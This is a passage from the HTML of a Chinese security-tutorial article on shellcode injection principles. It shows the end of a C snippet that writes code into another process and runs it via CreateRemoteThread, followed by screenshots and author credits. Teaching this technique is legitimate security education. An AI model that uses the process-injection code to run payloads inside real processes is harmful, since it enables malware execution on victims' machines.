class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">&amp;</span><span style="color: rgb(51, 51, 51);">dwWritesBytes </span><span style="color: rgb(150, 152, 150);">//成功写入的字节数</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(!</span><span style="color: rgb(51, 51, 51);">bRet</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">VirtualFreeEx</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> MEM_DECOMMIT</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//3.向目标程序调用一个线程 创建远程线程 执行写入代码</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    HANDLE hRemoteThread </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">CreateRemoteThread</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标进程</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">LPTHREAD_START_ROUTINE</span><span style="color: rgb(51, 51, 51);">)</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//目标进程的回调函数</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//回调参数</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        NULL</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">}</span></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.38715953307393" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/5_GX1XK4V4dAM2CaqSvcB4iaRR15CHAQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9daZbNBsJluBLOgoXDqWMEgz1V9VyzVL01pNia4l1nAVatmnGX1XK4V4dAM2CaqSvcB4iaRR15CHAQ/640?wx_fmt=png'" data-type="png" data-w="1542" style="box-sizing: border-box;margin: 0.1em auto 0.5em;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3132372214941022" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/6_r56Q1ldXyMVMU97GTcDB70UicQ5Fag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9daZbNBsJluBLOgoXDqWMEZGibFvNAWbTsz0hODFvTia8aBeYr56Q1ldXyMVMU97GTcDB70UicQ5Fag/640?wx_fmt=png'" data-type="png" data-w="763" style="box-sizing: border-box;margin: 0.1em auto 0.5em;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p><img src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/7_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-ratio="0.109375" data-w="640"  /></p><p style="text-align: center;"><br  /></p><p style="text-align: center;"><span style="color: rgb(255, 104, 39);"><strong>点赞 转发 在看</strong></span></p><p style="text-align: center;"><span style="color: rgb(255, 104, 39);"><strong><br  /></strong></span></p><p style="text-align: right;"><span style="color: rgb(136, 136, 136);font-size:13px;line-height:33px;;">原创投稿作者：一寸一叶</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/8_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>